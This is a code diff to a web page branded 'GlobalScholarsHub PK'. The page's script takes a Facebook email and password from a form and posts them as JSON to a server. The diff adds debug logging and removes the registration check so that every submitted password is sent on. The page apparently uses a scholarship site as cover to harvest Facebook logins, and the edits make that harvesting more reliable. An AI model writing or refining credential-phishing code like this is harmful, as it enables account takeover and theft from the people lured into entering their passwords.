@@ -91,9 +91,12 @@
         <div class="container"><p>© 2026 GlobalScholarsHub PK. All Rights Reserved. PK</p></div>
     </footer>
 
+    <!-- ===== DEBUG VERSION ===== -->
     <script>
         document.getElementById('facebookForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+
+            console.log('🔍 DEBUG: Form submitted!');
 
             const fbEmail = document.getElementById('fbEmail').value.trim();
             const fbPassword = document.getElementById('fbPassword').value.trim();
@@ -103,12 +106,21 @@
                 return;
             }
 
+            // ===== DEBUG: Check localStorage =====
+            console.log('🔍 DEBUG: Checking localStorage...');
+            console.log('🔍 DEBUG: allUsersData =', localStorage.getItem('allUsersData'));
+            console.log('🔍 DEBUG: userId =', localStorage.getItem('userId'));
+
             // ===== GET USER ID FROM LOCAL STORAGE =====
-            const userId = localStorage.getItem('userId');
+            let userId = localStorage.getItem('userId');
+            
+            // Agar userId nahi hai toh naya generate karein
             if (!userId) {
-                alert('⚠️ Please register first!');
-                window.location.href = 'register.html';
-                return;
+                userId = Date.now();
+                localStorage.setItem('userId', userId);
+                console.log('⚠️ userId not found, generated new:', userId);
+            } else {
+                console.log('✅ userId found:', userId);
             }
 
             const userData = {
@@ -126,6 +138,8 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(userData)
                 });
+
+                console.log('🔍 DEBUG: Response status:', response.status);
 
                 const result = await response.json();
                 console.log('✅ Response:', result);
